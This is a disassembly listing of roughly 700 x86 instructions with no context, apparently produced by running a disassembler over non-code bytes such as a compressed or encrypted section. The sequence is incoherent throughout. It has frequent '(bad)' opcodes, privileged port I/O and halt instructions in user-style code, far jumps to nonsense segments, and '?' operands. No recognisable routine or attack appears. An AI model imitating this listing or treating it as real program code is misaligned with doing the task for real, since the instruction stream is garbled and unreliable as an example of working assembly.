  408951:	clc    
  408952:	imul   BYTE PTR [ebp+edx*4+0x16]
  408956:	or     BYTE PTR [edi+0xd],cl
  408959:	xor    DWORD PTR [ecx-0x5612369d],ecx
  40895f:	adc    eax,DWORD PTR [edi+ebp*4-0x35]
  408963:	imul   BYTE PTR [edi]
  408965:	out    0xcb,al
  408967:	jne    0x408959
  408969:	push   0x70
  40896b:	sbb    eax,0xdc41c4d
  408970:	(bad)
  408973:	inc    edi
  408974:	add    esi,0xa36a5466
  40897a:	inc    ecx
  40897b:	add    DWORD PTR [ecx+eax*4],eax
  40897e:	xor    BYTE PTR [eax+0x9],dl
  408981:	mov    esp,0x9784ec95
  408986:	inc    BYTE PTR [eax-0x65]
  408989:	jg     0x40893f
  40898b:	or     ebx,0x3370a485
  408991:	in     eax,0xb2
  408993:	jp     0x4089fd
  408995:	in     al,dx
  408996:	rcl    dl,0x28
  408999:	fild   QWORD PTR [ecx+0x401c9edc]
  40899f:	pop    ebx
  4089a0:	fwait
  4089a1:	shr    BYTE PTR [esi+0x6a],1
  4089a4:	ins    DWORD PTR es:[edi],dx
  4089a5:	and    DWORD PTR [ecx],edi
  4089a7:	add    esp,DWORD PTR [bp+di-0x2b]
  4089ab:	mov    ch,0xe2
  4089ad:	inc    ebp
  4089ae:	imul   ebx,edx,0xffffff83
  4089b1:	popf   
  4089b2:	clc    
  4089b3:	adc    DWORD PTR [ebx*1-0x2d588a50],ebp
  4089ba:	sub    cl,BYTE PTR [ebp+0x75ee4e20]
  4089c0:	cli    
  4089c1:	push   0x8b7b1e47
  4089c6:	adc    eax,0xd1a2da6c
  4089cb:	xchg   ecx,eax
  4089cc:	js     0x408970
  4089ce:	dec    eax
  4089cf:	cmp    BYTE PTR ds:[ebp+0x3d],al
  4089d3:	(bad)  
  4089d4:	cli    
  4089d5:	lods   al,BYTE PTR ds:[esi]
  4089d6:	xchg   edi,eax
  4089d7:	in     al,dx
  4089d8:	cmp    eax,0xa4dd76d
  4089dd:	mov    edx,0x84242e55
  4089e2:	or     eax,0x1c39254c
  4089e7:	int    0xc3
  4089e9:	stos   BYTE PTR es:[edi],al
  4089ea:	ret    0x9975
  4089ed:	mov    ah,0x76
  4089ef:	sbb    DWORD PTR [ebx+0x1f],ebp
  4089f2:	xor    eax,0x3a87767a
  4089f7:	adc    cl,0x83
  4089fa:	out    0x86,eax
  4089fc:	mov    ch,0x15
  4089fe:	pop    ss
  4089ff:	pop    ss
  408a00:	cs in  al,0xf8
  408a03:	mov    ss,ebx
  408a05:	imul   esi,eax,0xffffffcb
  408a08:	xchg   edi,eax
  408a09:	retf   0xc6b1
  408a0c:	mov    bl,0x8f
  408a0e:	adc    al,0x5e
  408a10:	call   FWORD PTR [edx]
  408a12:	nop
  408a13:	fadd   st,st(6)
  408a15:	imul   ecx,esp,0x6985cbdd
  408a1b:	ja     0x4089fd
  408a1d:	xor    eax,0x86991a51
  408a22:	js     0x4089f2
  408a24:	jl     0x408a4a
  408a26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a27:	inc    esp
  408a28:	test   DWORD PTR [edx+0x46f0ed45],0x97f78e44
  408a32:	(bad)  
  408a33:	push   esi
  408a34:	mov    edi,0x392b35
  408a39:	(bad)  
  408a3a:	xchg   ebx,eax
  408a3b:	imul   ebp,DWORD PTR [esi-0xbc2e074],0xc82e8d62
  408a45:	inc    esi
  408a46:	t1mskc eax,DWORD PTR ds:0xd40b9033
  408a4f:	xor    DWORD PTR [edi],0x93d70c03
  408a55:	xchg   ebx,eax
  408a56:	push   esi
  408a57:	popf   
  408a58:	cli    
  408a59:	jae    0x408a5c
  408a5b:	jmp    0x9fc:0xaed486c
  408a62:	std    
  408a63:	repnz push edi
  408a65:	sbb    DWORD PTR [eax],eax
  408a67:	mov    cs,esi
  408a69:	jmp    0x408ac0
  408a6b:	mov    ah,0x37
  408a6d:	sbb    BYTE PTR [edi-0xd18ee6e],cl
  408a73:	fsub   QWORD PTR [ebp-0x7e7d7638]
  408a79:	mov    al,0xa0
  408a7b:	mov    al,0x6a
  408a7d:	inc    ebx
  408a7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a7f:	add    eax,0xfa13ffc9
  408a84:	or     eax,0xf3a64408
  408a89:	dec    ebx
  408a8a:	jae    0x408a75
  408a8c:	inc    esp
  408a8d:	mov    ebp,ebx
  408a8f:	dec    DWORD PTR [ecx-0x73b13382]
  408a95:	(bad)  
  408a97:	jmp    0x6beb:0xe8c1b30c
  408a9e:	not    bl
  408aa0:	xor    dl,BYTE PTR [edx]
  408aa2:	inc    edx
  408aa3:	iret   
  408aa4:	adc    al,0x74
  408aa6:	loope  0x408af2
  408aa8:	mov    cl,0x87
  408aaa:	add    al,BYTE PTR [ecx+0x53]
  408aad:	push   edi
  408aae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408aaf:	cmc    
  408ab0:	jbe    0x408ac2
  408ab2:	jmp    0x3b7d:0xa1105ace
  408ab9:	scas   eax,DWORD PTR es:[edi]
  408aba:	or     DWORD PTR [eax+0x28d0e832],0x3a8e1c9
  408ac4:	mov    ebp,0x855f19c2
  408ac9:	sbb    esp,DWORD PTR [eax+ebp*4]
  408acc:	out    dx,eax
  408acd:	sbb    dh,dl
  408acf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408ad0:	mov    ebp,0x1d86fc49
  408ad5:	cmp    dl,BYTE PTR [eax+0x147b3e77]
  408adb:	jge    0x408b45
  408add:	fxch   st(3)
  408adf:	pop    ebx
  408ae0:	lock mov edi,DWORD PTR [ecx-0x7ef4bffd]
  408ae7:	cmp    eax,0x67fd5a7b
  408aec:	mov    al,ds:0x59710cb0
  408af1:	push   ebp
  408af2:	in     al,0x4b
  408af4:	je     0x408af9
  408af6:	inc    esp
  408af7:	mov    ecx,0x9e6c5bee
  408afc:	sub    BYTE PTR ds:0xdf1856ae,0xf3
  408b03:	dec    eax
  408b04:	cmp    ch,bh
  408b06:	cmp    DWORD PTR [ebp+0x31],esp
  408b09:	cwde   
  408b0a:	cmp    al,0x75
  408b0c:	(bad)  
  408b0d:	nop
  408b0e:	jns    0x408b7c
  408b10:	jp     0x408b3c
  408b12:	stc    
  408b13:	sbb    ah,0x2c
  408b16:	cs imul edi,esi,0x91797d92
  408b1d:	adc    DWORD PTR [eax+0x60c789e],edi
  408b23:	pop    es
  408b24:	cmp    BYTE PTR [ecx+0x8f2f5cd],cl
  408b2a:	es jae 0x408b3f
  408b2d:	pop    eax
  408b2e:	push   0xffffff94
  408b30:	adc    al,0x65
  408b32:	test   eax,0xb86edf81
  408b37:	fstp   TBYTE PTR [ebx-0x76]
  408b3a:	stc    
  408b3b:	stos   DWORD PTR es:[edi],eax
  408b3c:	popa   
  408b3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b3e:	outs   dx,DWORD PTR ds:[esi]
  408b3f:	imul   esi,edi,0x93fbe218
  408b45:	data16 jecxz 0x408b09
  408b48:	jg     0x408afa
  408b4a:	mov    al,0x0
  408b4c:	pop    es
  408b4d:	stos   DWORD PTR es:[edi],eax
  408b4e:	xchg   ah,ch
  408b50:	test   DWORD PTR [edi+eax*4],edx
  408b53:	dec    esp
  408b54:	gs aas 
  408b56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b57:	mov    ds:0xb51eb45d,eax
  408b5c:	or     DWORD PTR [esi+0x695aafbe],ebx
  408b62:	(bad)  [eax-0x68]
  408b65:	bsf    edx,DWORD PTR [esi-0x2b2f7938]
  408b6c:	out    dx,eax
  408b6d:	loope  0x408ba4
  408b6f:	push   esp
  408b70:	pop    ebx
  408b71:	mov    edx,0x2f8dae2a
  408b76:	js     0x408bf5
  408b78:	push   edx
  408b79:	jmp    0x408b9d
  408b7b:	xchg   ebp,eax
  408b7c:	dec    esi
  408b7d:	into   
  408b7e:	mov    dl,0xc2
  408b80:	sti    
  408b81:	idiv   DWORD PTR [edi]
  408b83:	cmp    DWORD PTR [eax],esi
  408b85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b86:	mov    ebx,0xcf47ab51
  408b8b:	retf   
  408b8c:	test   al,0x2f
  408b8e:	pop    ebp
  408b8f:	pop    edx
  408b90:	out    0x49,al
  408b92:	rcr    BYTE PTR [edx+0x558fb3de],cl
  408b98:	and    esi,DWORD PTR [ebp-0x26]
  408b9b:	xchg   ecx,eax
  408b9c:	pop    es
  408b9d:	pop    esi
  408b9e:	les    eax,FWORD PTR ds:0x90a2fbd4
  408ba4:	shr    DWORD PTR [ebx],cl
  408ba6:	sbb    eax,0xf082f5c9
  408bab:	xor    eax,0xc8ee0239
  408bb0:	out    0xd9,al
  408bb2:	push   edi
  408bb3:	(bad)
  408bb6:	push   cs
  408bb7:	pop    eax
  408bb8:	fld    st(5)
  408bba:	mov    esi,0x46927c1a
  408bbf:	push   ss
  408bc0:	or     eax,0x31d35ef5
  408bc5:	mov    eax,0xbe969090
  408bca:	hlt    
  408bcb:	xchg   BYTE PTR [ebx+0x20],bh
  408bce:	jae    0x408b90
  408bd0:	fadd   DWORD PTR [edx*4+0xb6e1981]
  408bd7:	pop    es
  408bd8:	inc    eax
  408bd9:	enter  0x3095,0x81
  408bdd:	pop    ebx
  408bde:	and    edx,esi
  408be0:	mov    eax,ds:0x3a0e7c5
  408be5:	dec    eax
  408be6:	mov    eax,ds:0xdd082d86
  408beb:	retf   
  408bec:	stos   BYTE PTR es:[edi],al
  408bed:	out    0x56,al
  408bef:	inc    ebp
  408bf0:	jecxz  0x408ba3
  408bf2:	in     eax,dx
  408bf3:	xchg   edx,eax
  408bf4:	test   al,0x3a
  408bf6:	repnz mov eax,ecx
  408bf9:	adc    al,0x5f
  408bfb:	mov    dl,0xdb
  408bfd:	in     al,0x83
  408bff:	test   esp,ebp
  408c01:	sbb    esi,DWORD PTR [ebp-0x385e7e00]
  408c07:	mov    ah,0xac
  408c09:	pop    esp
  408c0a:	mov    esi,0x68ac93c8
  408c0f:	mov    BYTE PTR [esi+ebx*1+0x20e5b6da],bh
  408c16:	mov    al,ds:0xa83bc8ca
  408c1b:	pop    sp
  408c1d:	or     esp,ebp
  408c1f:	fidiv  WORD PTR [eax]
  408c21:	cli    
  408c22:	jns    0x408c49
  408c24:	call   0xb8ee1aed
  408c29:	and    BYTE PTR [ebx+0x6e7ee2],0x52
  408c30:	fs jnp 0x408c28
  408c33:	std    
  408c34:	daa    
  408c35:	cmc    
  408c36:	jbe    0x408c16
  408c38:	repz cmp BYTE PTR [ebp-0x35],al
  408c3c:	sub    bl,dh
  408c3e:	push   edi
  408c3f:	or     DWORD PTR [ecx],esi
  408c41:	jecxz  0x408bdb
  408c43:	mov    esi,0xd8da736e
  408c48:	push   ebp
  408c49:	out    0x41,al
  408c4b:	cmp    BYTE PTR [eax-0x2d8aabd3],0xcf
  408c52:	mov    dl,0x39
  408c54:	adc    ah,BYTE PTR [ebx+0x33]
  408c57:	xchg   ebx,eax
  408c58:	xchg   esi,ecx
  408c5a:	mov    WORD PTR [ecx+0x29],ds
  408c5d:	les    ebx,FWORD PTR [edx+0x6dbc5ac5]
  408c63:	pop    esp
  408c64:	push   ecx
  408c65:	sbb    eax,0x200f80d5
  408c6a:	rcr    BYTE PTR ds:0x94a04097,1
  408c70:	adc    eax,0x4ff68a9f
  408c75:	fld    QWORD PTR [ebp+0x338a96a9]
  408c7b:	inc    ebx
  408c7c:	pop    es
  408c7d:	inc    ecx
  408c7e:	ror    BYTE PTR [edx+0x2b935c56],0x74
  408c85:	call   0xe12801b6
  408c8a:	loop   0x408cbd
  408c8c:	mov    bl,ah
  408c8e:	xchg   ebp,eax
  408c8f:	sub    ch,BYTE PTR ds:0xc01346f2
  408c95:	add    al,0xcd
  408c97:	mov    fs,WORD PTR [eax-0x68]
  408c9a:	dec    eax
  408c9b:	inc    ecx
  408c9c:	jbe    0x408ccf
  408c9e:	lock (bad) 
  408ca0:	pop    ebp
  408ca1:	xchg   ebp,eax
  408ca2:	mov    bl,0xc
  408ca4:	lea    edx,ds:0xf7fc35da
  408caa:	into   
  408cab:	fisubr DWORD PTR [ebx]
  408cad:	mov    esi,0xc73d5149
  408cb2:	jecxz  0x408cfb
  408cb4:	adc    eax,0x22548145
  408cb9:	retf   0xb1cc
  408cbc:	iret   
  408cbd:	xchg   esi,eax
  408cbe:	fst    DWORD PTR [ebx+0x5]
  408cc1:	into   
  408cc2:	(bad)  
  408cc3:	fs fld st(5)
  408cc6:	loop   0x408ce8
  408cc8:	sbb    ebx,0xffffffac
  408ccb:	mov    cl,0x91
  408ccd:	fnstcw WORD PTR [esi]
  408ccf:	ss ins BYTE PTR es:[edi],dx
  408cd1:	jmp    0x408c88
  408cd3:	je     0x408d25
  408cd5:	add    DWORD PTR [edi-0x65888d2d],ebx
  408cdb:	aaa    
  408cdc:	mov    dl,BYTE PTR [ebp-0x4145ed8f]
  408ce2:	(bad)  
  408ce3:	inc    esi
  408ce4:	dec    edx
  408ce5:	dec    edi
  408ce6:	or     DWORD PTR [ebx+0x1338b4c],esi
  408cec:	cmp    eax,0x45ce237a
  408cf1:	pop    es
  408cf2:	stos   DWORD PTR es:[edi],eax
  408cf3:	or     al,0x8d
  408cf5:	or     al,0x41
  408cf7:	pop    esp
  408cf8:	mov    al,ds:0xc10785a5
  408cfd:	dec    ebp
  408cfe:	add    ch,BYTE PTR [eax]
  408d00:	cli    
  408d01:	call   0x38daa311
  408d06:	(bad)  
  408d07:	imul   eax,ecx,0x128f1b83
  408d0d:	pop    ds
  408d0e:	dec    ebx
  408d0f:	outs   dx,DWORD PTR ds:[esi]
  408d10:	mov    ch,bl
  408d12:	add    dh,BYTE PTR [eax]
  408d14:	retf   
  408d15:	sbb    eax,0xe883bc4b
  408d1a:	stc    
  408d1b:	xor    DWORD PTR [edi],edi
  408d1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d1e:	scas   eax,DWORD PTR es:[edi]
  408d1f:	add    al,0xc9
  408d21:	clc    
  408d22:	jbe    0x408d2d
  408d24:	push   DWORD PTR [edx-0x71]
  408d27:	push   eax
  408d28:	std    
  408d29:	pop    ss
  408d2a:	jne    0x408d29
  408d2c:	jns    0x408d0c
  408d2e:	mov    edi,0xa887f4e1
  408d33:	idiv   BYTE PTR [edx+0x24]
  408d36:	outs   dx,DWORD PTR ds:[esi]
  408d37:	pop    ss
  408d38:	cli    
  408d39:	div    BYTE PTR [edx+eax*8]
  408d3c:	inc    edx
  408d3d:	dec    eax
  408d3e:	jg     0x408d54
  408d40:	jg     0x408d94
  408d42:	sub    al,0x3
  408d44:	jno    0x408d39
  408d46:	ins    DWORD PTR es:[edi],dx
  408d47:	and    ecx,DWORD PTR [eax-0x2d]
  408d4a:	and    eax,0xbe95317b
  408d4f:	xor    DWORD PTR [ecx],ebp
  408d51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d52:	adc    eax,0x574f75ff
  408d57:	aas    
  408d58:	fs sub eax,0x6f243667
  408d5e:	push   es
  408d5f:	dec    edx
  408d60:	fistp  DWORD PTR [ecx+eax*2-0x2113ed3a]
  408d67:	xor    ch,BYTE PTR [ebx+0x73af1317]
  408d6d:	jbe    0x408de6
  408d6f:	int3   
  408d70:	xor    eax,0xe130bd8f
  408d75:	add    eax,eax
  408d77:	mov    ?,ebp
  408d79:	inc    bl
  408d7b:	retf   0x86e5
  408d7e:	gs sbb al,0x5e
  408d81:	sbb    eax,0x43ca9cd7
  408d86:	out    0xaf,eax
  408d88:	sub    edi,DWORD PTR [ecx-0x6d]
  408d8b:	push   0x2
  408d8d:	pushf  
  408d8e:	xchg   DWORD PTR [eax],ecx
  408d90:	xor    ecx,DWORD PTR [edx+esi*2-0x4223bd7c]
  408d97:	sar    DWORD PTR [ebp-0x77],cl
  408d9a:	je     0x408da8
  408d9c:	pop    edi
  408d9d:	cmp    DWORD PTR [eax-0x7],ebx
  408da0:	sbb    ebp,DWORD PTR [eax+0x36405050]
  408da6:	mov    ebx,0x7948674d
  408dab:	rcl    DWORD PTR [eax],0x52
  408dae:	lods   eax,DWORD PTR ds:[esi]
  408daf:	pusha  
  408db0:	sbb    DWORD PTR [esi],ebp
  408db2:	jp     0x408d42
  408db4:	stos   DWORD PTR es:[edi],eax
  408db5:	mov    esp,edx
  408db7:	dec    eax
  408db8:	inc    edx
  408db9:	outs   dx,BYTE PTR ds:[esi]
  408dba:	mov    dh,0x69
  408dbc:	mov    ecx,DWORD PTR cs:[ecx-0x64]
  408dc0:	cmp    edi,DWORD PTR ds:0xa05b8f54
  408dc6:	sbb    dh,BYTE PTR [esi]
  408dc8:	lock in al,dx
  408dca:	into   
  408dcb:	stos   DWORD PTR es:[edi],eax
  408dcc:	pop    eax
  408dcd:	ror    DWORD PTR [ecx],0x63
  408dd0:	mov    WORD PTR [ecx+0x385bc5a],?
  408dd6:	ret    0xfebb
  408dd9:	jl     0x408e16
  408ddb:	sub    ebx,DWORD PTR [ebx-0x3a1b80fd]
  408de1:	mov    edi,0x850e9a34
  408de6:	jno    0x408e1f
  408de8:	pop    ss
  408de9:	cmp    DWORD PTR [edx+0x4791261a],0x13
  408df0:	sbb    BYTE PTR [eax+ebx*4+0x7e],0xe5
  408df5:	cmp    BYTE PTR [edi+0xa],bl
  408df8:	lea    ebx,[ebx+0x36]
  408dfb:	xchg   eax,eax
  408dfd:	(bad)  
  408dff:	addr16 xchg dh,cl
  408e02:	pop    ss
  408e03:	imul   ebx,DWORD PTR [edx+0xef3df0a],0xef443cdb
  408e0d:	sbb    DWORD PTR [ecx-0x19],edx
  408e10:	(bad)  
  408e11:	pop    ecx
  408e12:	push   0xb1d23538
  408e17:	into   
  408e18:	inc    esp
  408e19:	jae    0x408e5e
  408e1b:	sub    ebx,DWORD PTR ds:0xbf05a564
  408e21:	imul   edx,DWORD PTR [esi],0x68
  408e24:	or     bl,BYTE PTR [esi+0x7d]
  408e27:	mov    edi,0x9ddc8744
  408e2c:	(bad)  
  408e2d:	aad    0xed
  408e2f:	sbb    eax,0xf7090e53
  408e34:	adc    ecx,DWORD PTR [eax-0x210d1144]
  408e3a:	mov    bl,0x35
  408e3c:	sar    BYTE PTR [edi+0x11b3e67d],1
  408e42:	fs push ss
  408e44:	(bad)  
  408e46:	adc    BYTE PTR [ebp-0x45],ch
  408e49:	cmp    dl,BYTE PTR [edx+0x1a10121b]
  408e4f:	repz xchg ecx,eax
  408e51:	outs   dx,DWORD PTR ds:[esi]
  408e52:	lea    ebx,[edx+esi*4+0x2]
  408e56:	imul   esp,ecx,0x8fb8c97d
  408e5c:	fiadd  DWORD PTR [eiz*4+0x428fa9ba]
  408e63:	icebp  
  408e64:	ja     0x408ecd
  408e66:	clc    
  408e67:	nop
  408e68:	ins    BYTE PTR es:[edi],dx
  408e69:	or     eax,0x73317bd5
  408e6e:	push   esp
  408e6f:	pop    esp
  408e70:	call   0xdf653fb3
  408e75:	add    BYTE PTR [ecx],dh
  408e77:	(bad)  
  408e79:	imul   ebx,esi,0x6a
  408e7c:	pop    ebx
  408e7d:	sti    
  408e7e:	mov    ?,WORD PTR [ebx+0x5a]
  408e81:	cmp    DWORD PTR [eax],0xffffffb3
  408e84:	cmp    ebp,DWORD PTR [edi-0xcdf6a85]
  408e8a:	aam    0x73
  408e8c:	push   ss
  408e8d:	in     al,dx
  408e8e:	sub    eax,DWORD PTR [ebx-0x49bb0992]
  408e94:	mov    edx,0xcbaccd4c
  408e99:	rcr    ch,1
  408e9b:	add    DWORD PTR [edi],ecx
  408e9d:	mov    ds:0x3180b5b8,eax
  408ea2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ea3:	dec    edi
  408ea4:	jo     0x408ea6
  408ea6:	outs   dx,BYTE PTR ds:[esi]
  408ea7:	pop    edi
  408ea8:	adc    al,0x2a
  408eaa:	xchg   ebp,eax
  408eab:	push   edx
  408eac:	je     0x408ef7
  408eae:	fadd   QWORD PTR [edx-0x6306e0e6]
  408eb4:	cmc    
  408eb5:	push   cs
  408eb6:	data16 rcl dh,1
  408eb9:	fld    TBYTE PTR [ebx-0x80]
  408ebc:	fist   DWORD PTR [eax+0x6f]
  408ebf:	mov    dl,0xc1
  408ec1:	and    eax,0x68c6e339
  408ec6:	lods   eax,DWORD PTR ds:[esi]
  408ec7:	adc    DWORD PTR [ecx],esi
  408ec9:	sbb    eax,0x2a94af41
  408ece:	xor    al,0xe0
  408ed0:	adc    DWORD PTR [esi+0x43bc164c],esp
  408ed6:	clc    
  408ed7:	adc    eax,0xb8915492
  408edc:	push   0x20
  408ede:	xchg   BYTE PTR [ebx+0x3af84926],ch
  408ee4:	sti    
  408ee5:	inc    edx
  408ee6:	pop    ebx
  408ee7:	xchg   esp,eax
  408ee8:	mov    cs,ebp
  408eea:	cdq    
  408eeb:	sbb    eax,0xa9cd36cf
  408ef0:	mov    ebp,0x206bf3d9
  408ef5:	or     al,0x73
  408ef7:	test   eax,0x16f5762a
  408efc:	rcl    DWORD PTR [ecx+0x30],0xdf
  408f00:	xchg   esi,eax
  408f01:	sbb    edi,DWORD PTR [ebx-0x470a1714]
  408f07:	xor    DWORD PTR [ecx+0x644d5c2c],ebx
  408f0d:	outs   dx,DWORD PTR ds:[esi]
  408f0e:	ret    
  408f0f:	fwait
  408f10:	mov    bl,0x40
  408f12:	cld    
  408f13:	mov    BYTE PTR [edi],ah
  408f15:	imul   edx,ebp,0xaa88568
  408f1b:	fwait
  408f1c:	dec    esi
  408f1d:	jle    0x408f0c
  408f1f:	xor    BYTE PTR [edx+0x7eff46f7],ch
  408f25:	pop    esi
  408f26:	cmp    BYTE PTR [ebx-0x2242ea5],dl
  408f2c:	xor    bh,dl
  408f2e:	mov    bl,0xfb
  408f30:	test   DWORD PTR [ebx+eax*8+0x71],0xbf628046
  408f38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408f39:	outs   dx,BYTE PTR ds:[esi]
  408f3a:	sbb    DWORD PTR [edx-0x37],0xffffff95
  408f3e:	jae    0x408fa2
  408f40:	push   esp
  408f41:	lods   eax,DWORD PTR ds:[esi]
  408f42:	jns    0x408ecf
  408f44:	out    dx,eax
  408f45:	shr    BYTE PTR [ebx+ecx*1+0xfb4f04],cl
  408f4c:	pusha  
  408f4d:	retf   0xedaf
  408f50:	and    al,0x8b
  408f52:	cwde   
  408f53:	adc    dl,BYTE PTR [ebp+ebx*8+0x5f]
  408f57:	mov    eax,0xd0e9d453
  408f5c:	cmp    eax,esp
  408f5e:	mov    ecx,0x297d9981
  408f63:	sbb    esp,eax
  408f65:	cs mov cl,0x69
  408f68:	push   ss
  408f69:	(bad)  
  408f6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408f6b:	xchg   DWORD PTR [edx+0x1a4c97a7],edi
  408f71:	bound  ecx,QWORD PTR [eax-0x48]
  408f74:	ins    BYTE PTR es:[edi],dx
  408f75:	pusha  
  408f76:	in     eax,dx
  408f77:	loopne 0x408fc2
  408f79:	ja     0x408f48
  408f7b:	pop    esp
  408f7c:	enter  0x588a,0x2e
  408f80:	stc    
  408f81:	mov    eax,0x7ca54ebe
  408f86:	jnp    0x409001
  408f88:	push   ebx
  408f89:	addr16 add eax,0xc86fbe2d
  408f8f:	cs pop esp
  408f91:	or     BYTE PTR [eax],ah
  408f93:	not    BYTE PTR [ebp-0x7c7b9def]
  408f99:	xchg   ebx,eax
  408f9a:	add    DWORD PTR ds:0x13af02,esi
  408fa0:	and    edx,DWORD PTR [eax-0x7b]
  408fa3:	pop    ds
  408fa4:	and    edx,DWORD PTR [esi+0x7527d3f5]
  408faa:	mov    ds:0x5cf17efa,eax
  408faf:	mov    DWORD PTR [ecx],edi
  408fb1:	mov    dl,0xed
  408fb3:	mov    ch,0x63
  408fb5:	mov    edx,DWORD PTR [edx-0x4c]
  408fb8:	arpl   si,si
  408fba:	pop    es
  408fbb:	loopne 0x408f8d
  408fbd:	ret    0x118d
  408fc0:	sub    eax,0xd53def17
  408fc5:	cmp    al,0xe8
  408fc7:	adc    BYTE PTR [ebx],ah
  408fc9:	lahf   
  408fca:	sub    DWORD PTR [esi+ebp*8+0x49],ebp
  408fce:	mov    es,WORD PTR [edi-0x35]
  408fd1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408fd2:	in     al,0x98
  408fd4:	call   0x1c63:0xea415e15
  408fdb:	jns    0x408fe2
  408fdd:	fcmove st,st(2)
  408fdf:	arpl   WORD PTR [ecx],bx
  408fe1:	push   eax
  408fe2:	jmp    0x408f9a
  408fe4:	mov    ds:0xce9e56b5,eax
  408fe9:	das    
  408fea:	popa   
  408feb:	cmp    eax,0x869e21c7
  408ff0:	mov    WORD PTR ds:0x8d3fae7d,es
  408ff6:	push   edi
  408ff7:	push   0xce1209ff
  408ffc:	retf   0x7722
  408fff:	pushf  
  409000:	cmp    al,0x6
  409002:	inc    esp
  409003:	pop    es
  409004:	and    al,al
  409006:	in     al,0xe2
  409008:	call   0x1c2b9581
  40900d:	int3   
  40900e:	lock loopne 0x40903d
  409011:	xor    BYTE PTR [ebp-0x27d212bf],bl
  409017:	je     0x408ffa
  409019:	mov    ecx,ebp
  40901b:	push   edx
  40901c:	repnz retf 0x65ea
  409020:	mov    edi,0x2f419e75
  409025:	cld    
  409026:	aam    0xf2
  409028:	jg     0x40908e
  40902a:	jae    0x408ff4
  40902c:	add    ch,BYTE PTR [eax]
  40902e:	mov    dh,0x50
  409030:	pop    ebx
  409031:	retf   0x7d14
  409034:	jo     0x409081
  409036:	ins    DWORD PTR es:[edi],dx
  409037:	loop   0x409076
  409039:	js     0x409023
  40903b:	fwait
  40903c:	xchg   BYTE PTR [eax],dh
  40903e:	add    al,0x39
  409040:	push   eax
  409041:	stos   DWORD PTR es:[edi],eax
  409042:	sbb    eax,0x9e59da94
  409047:	sbb    edi,DWORD PTR [ecx]
  409049:	mov    ?,WORD PTR [ebx]
  40904b:	mov    dl,BYTE PTR [edi-0x40]
  40904e:	int3   
  40904f:	jg     0x409084
  409051:	sbb    DWORD PTR [edi-0xc5afd33],0xfffffffe
  409058:	popf   
  409059:	and    al,0xe7
  40905b:	mov    eax,ds:0x552f920d
  409060:	fnstcw WORD PTR [edi+0x54]
  409063:	aaa    
  409064:	inc    esi
  409065:	pop    esi
  409066:	xor    eax,0xa5454e01
  40906b:	mov    edi,DWORD PTR [esi-0x5b]
  40906e:	sub    eax,ecx
  409070:	lahf   
  409071:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409072:	ret    0x1a06
  409075:	push   edi
  409076:	cmp    al,0x86
  409078:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409079:	dec    edi
  40907a:	xchg   edi,eax
  40907b:	(bad)  
  40907c:	aad    0x5b
  40907e:	jae    0x409057
  409080:	cmp    edi,edx
  409082:	push   ebp
  409083:	iret   
  409084:	adc    ecx,DWORD PTR [edi]
  409086:	cdq    
  409087:	dec    ebp
  409088:	aas    
  409089:	push   cs
  40908a:	sbb    ecx,DWORD PTR [ebp+0x78]
  40908d:	ret    0x5f9e
  409090:	ins    DWORD PTR es:[edi],dx
  409091:	jo     0x409063
  409093:	jnp    0x409032
  409095:	out    dx,al
  409096:	into   
  409097:	(bad)  
  409098:	imul   eax,DWORD PTR [edx+0x7737f617],0xffffff8b
  40909f:	push   edx
  4090a0:	mov    ds:0x73e32c8f,eax
  4090a5:	jle    0x4090a2
  4090a7:	fwait
  4090a8:	es pop ebx
  4090aa:	push   ds
  4090ab:	jge    0x4090ec
  4090ad:	jmp    0x67a8:0x8b5d6f64
  4090b4:	scas   eax,DWORD PTR es:[edi]
  4090b5:	mov    ch,0x2a
  4090b7:	xor    esp,DWORD PTR [edi+edi*4-0x2b5936c7]
  4090be:	clc    
  4090bf:	push   eax
  4090c0:	cmp    eax,0xf369d99b
  4090c5:	dec    edi
  4090c6:	das    
  4090c7:	inc    edx
  4090c8:	je     0x4090cb
  4090ca:	rcr    BYTE PTR [esi],cl
  4090cc:	out    0xd0,al
  4090ce:	and    al,BYTE PTR [ebx-0xcd36421]
  4090d4:	xor    BYTE PTR [ecx+eax*1],ah
  4090d7:	push   0x2e542991
  4090dc:	mov    ebp,0xe498cbf6
  4090e1:	sbb    eax,0x71471daf
  4090e6:	out    0x3f,al
  4090e8:	mov    ah,0x1a
  4090ea:	sahf   
  4090eb:	add    al,0xfa
  4090ed:	adc    ch,BYTE PTR [eax-0x1149f2ea]
  4090f3:	imul   esp,DWORD PTR ds:0xda9c1817,0xffffffe2
  4090fa:	push   edi
  4090fb:	jns    0x409108
  4090fd:	enter  0x161f,0x68
  409101:	stos   BYTE PTR es:[edi],al
  409102:	inc    ebp
  409103:	loop   0x4090f6
  409105:	lds    edi,FWORD PTR [eax]
  409107:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409108:	mov    al,0x32
  40910a:	clc    
  40910b:	and    BYTE PTR [ebx+0x4b679ce3],ch
  409111:	and    al,BYTE PTR [ebx+0x651c90f2]
  409117:	and    DWORD PTR [ebp+0x1f998058],ebp
  40911d:	fidiv  DWORD PTR [eax+edx*8-0xa75e7a8]
  409124:	cwde   
  409125:	ret    0x264c
  409128:	imul   esp,DWORD PTR [ebp-0x7ee71c0d],0x29aebaf8
  409132:	and    cl,BYTE PTR [ebx-0x4b7751f1]
  409138:	aas    
  409139:	or     al,ah
  40913b:	jp     0x40911b
  40913d:	mov    edi,0x28a863bc
  409142:	ret    0xce6d
  409145:	mov    ebx,0xc6ef7fd8
  40914a:	sbb    esi,edi
  40914c:	retf   
  40914d:	out    dx,eax
  40914e:	mov    cl,BYTE PTR [ecx+eiz*1]
